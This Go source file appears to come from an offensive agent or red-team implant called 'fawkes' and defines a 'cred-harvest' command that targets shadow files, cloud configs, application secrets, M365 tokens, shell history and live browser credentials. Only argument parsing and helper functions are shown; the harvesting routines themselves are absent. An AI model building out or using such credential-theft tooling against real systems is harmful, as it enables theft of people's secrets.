package commands

import (
	"encoding/json"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

type CredHarvestCommand struct{}

func (c *CredHarvestCommand) Name() string { return "cred-harvest" }
func (c *CredHarvestCommand) Description() string {
	return "Harvest credentials from shadow, cloud configs, and application secrets (T1552)"
}

type credHarvestArgs struct {
	Action string `json:"action"` // shadow, cloud, configs, windows, browser-live, all
	User   string `json:"user"`   // Filter by username (optional)
}

func (c *CredHarvestCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		actions := "shadow, cloud, configs, history, browser-live, all"
		if runtime.GOOS == "windows" {
			actions = "cloud, configs, windows, m365-tokens, history, browser-live, all"
		}
		return errorf("Error: parameters required. Actions: %s", actions)
	}

	var args credHarvestArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Plain text fallback: "shadow", "cloud", "configs", "all", "shadow root"
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.User = parts[1]
		}
	}

	return credHarvestDispatch(args)
}

func credIndentLines(s string, prefix string) string {
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		if line != "" {
			lines[i] = prefix + line
		}
	}
	return strings.Join(lines, "\n")
}

// extractQuotedOrWord extracts a quoted string ('...' or "...") or the first word from input.
func extractQuotedOrWord(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	if s[0] == '\'' || s[0] == '"' {
		quote := s[0]
		end := strings.IndexByte(s[1:], quote)
		if end != -1 {
			return s[1 : end+1]
		}
	}
	// First whitespace-delimited word
	if end := strings.IndexAny(s, " \t"); end != -1 {
		return s[:end]
	}
	return s
}
